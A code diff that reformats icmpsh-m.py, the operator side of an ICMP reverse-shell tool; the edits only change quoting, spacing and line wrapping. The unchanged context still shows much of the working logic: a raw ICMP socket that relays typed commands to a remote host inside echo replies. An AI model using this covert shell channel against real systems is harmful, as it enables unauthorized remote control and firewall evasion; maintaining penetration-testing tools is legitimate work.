@@ -25,6 +25,7 @@ import socket
 import subprocess
 import sys
 
+
 def setNonBlocking(fd):
     """
     Make a file descriptor non-blocking
@@ -36,16 +37,17 @@ def setNonBlocking(fd):
     flags = flags | os.O_NONBLOCK
     fcntl.fcntl(fd, fcntl.F_SETFL, flags)
 
+
 def main(src, dst):
     if subprocess.mswindows:
-        sys.stderr.write('icmpsh master can only run on Posix systems\n')
+        sys.stderr.write("icmpsh master can only run on Posix systems\n")
         sys.exit(255)
 
     try:
         from impacket import ImpactDecoder
         from impacket import ImpactPacket
     except ImportError:
-        sys.stderr.write('You need to install Python Impacket library first\n')
+        sys.stderr.write("You need to install Python Impacket library first\n")
         sys.exit(255)
 
     # Make standard input a non-blocking file
@@ -58,7 +60,9 @@ def main(src, dst):
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
     except socket.error:
-        sys.stderr.write('You need to run icmpsh master with administrator privileges\n')
+        sys.stderr.write(
+            "You need to run icmpsh master with administrator privileges\n"
+        )
         sys.exit(1)
 
     sock.setblocking(0)
@@ -77,10 +81,10 @@ def main(src, dst):
     decoder = ImpactDecoder.IPDecoder()
 
     while True:
-        cmd = ''
+        cmd = ""
 
         # Wait for incoming replies
-        if sock in select.select([ sock ], [], [])[0]:
+        if sock in select.select([sock], [], [])[0]:
             buff = sock.recv(4096)
 
             if 0 == len(buff):
@@ -93,7 +97,11 @@ def main(src, dst):
             icmppacket = ippacket.child()
 
             # If the packet matches, report it to the user
-            if ippacket.get_ip_dst() == src and ippacket.get_ip_src() == dst and 8 == icmppacket.get_icmp_type():
+            if (
+                ippacket.get_ip_dst() == src
+                and ippacket.get_ip_src() == dst
+                and 8 == icmppacket.get_icmp_type()
+            ):
                 # Get identifier and sequence number
                 ident = icmppacket.get_icmp_id()
                 seq_id = icmppacket.get_icmp_seq()
@@ -108,7 +116,7 @@ def main(src, dst):
                 except:
                     pass
 
-                if cmd == 'exit\n':
+                if cmd == "exit\n":
                     return
 
                 # Set sequence number and identifier
@@ -128,10 +136,11 @@ def main(src, dst):
                 # Send it to the target host
                 sock.sendto(ip.get_packet(), (dst, 0))
 
-if __name__ == '__main__':
+
+if __name__ == "__main__":
     if len(sys.argv) < 3:
-        msg = 'missing mandatory options. Execute as root:\n'
-        msg += './icmpsh-m.py <source IP address> <destination IP address>\n'
+        msg = "missing mandatory options. Execute as root:\n"
+        msg += "./icmpsh-m.py <source IP address> <destination IP address>\n"
         sys.stderr.write(msg)
         sys.exit(1)
 
